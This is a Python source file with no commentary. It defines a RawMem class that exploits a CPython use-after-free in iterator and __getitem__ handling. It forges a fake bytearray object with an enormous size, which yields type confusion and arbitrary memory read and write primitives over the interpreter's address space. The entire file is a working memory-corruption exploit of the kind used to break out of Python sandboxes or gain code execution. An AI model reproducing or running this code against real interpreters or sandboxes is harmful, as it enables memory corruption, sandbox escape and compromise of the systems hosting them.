from __future__ import annotations

import struct
import sys
from typing import Final

_I64_MAX: Final = 0x7FFFFFFFFFFFFFFF


class RawMem:
    @staticmethod
    def id(o: object) -> int:
        _s = object()
        _x = int(repr(_s).split("0x")[-1].rstrip(">"), 16) ^ id(_s)
        return id(o) ^ _x

    def __init__(self) -> None:
        buf = bytearray(
            struct.pack(
                "<QQQQQQqqq",
                0,
                0,
                0x12345,
                RawMem.id(bytearray),
                _I64_MAX,
                _I64_MAX,
                0,
                0,
                0,
            )
        )

        class Victim:
            __slots__ = ("lock",) * 20

            def __init__(self) -> None:
                self.lock = False

            def __getitem__(self, _: int) -> None:
                if self.lock:
                    raise IndexError
                self.lock = True
                next(it)

        mem = Victim()
        mem_size = mem.__sizeof__()
        it = iter(mem)
        list(it)
        _anchor = buf.ljust(mem_size, b"\0")
        assert type(mem) is bytearray, f"type confusion failed: got {type(mem)}"

        mem_addr = RawMem.id(mem)
        mem[mem_addr + 8 : mem_addr + 16] = RawMem.id(bytearray).to_bytes(8, sys.byteorder)

        idv = RawMem.id(Victim)
        rc = int.from_bytes(mem[idv : idv + 8], sys.byteorder)
        mem[idv : idv + 8] = (rc + 1).to_bytes(8, sys.byteorder)

        mem[mem_addr : mem_addr + 8] = struct.pack("<Q", 0xFFFFFF)

        self._mem: Final = mem
        self._anchor: Final = _anchor

    def read_u8(self, addr: int) -> int:
        return self._mem[addr]

    def read_u32(self, addr: int) -> int:
        return int.from_bytes(self._mem[addr : addr + 4], sys.byteorder)

    def read_u64(self, addr: int) -> int:
        return int.from_bytes(self._mem[addr : addr + 8], sys.byteorder)

    def read_bytes(self, addr: int, length: int) -> bytes:
        return bytes(self._mem[addr : addr + length])

    def write_u8(self, addr: int, val: int) -> None:
        self._mem[addr] = val

    def write_u32(self, addr: int, val: int) -> None:
        self._mem[addr : addr + 4] = (val & 0xFFFF_FFFF).to_bytes(4, sys.byteorder)
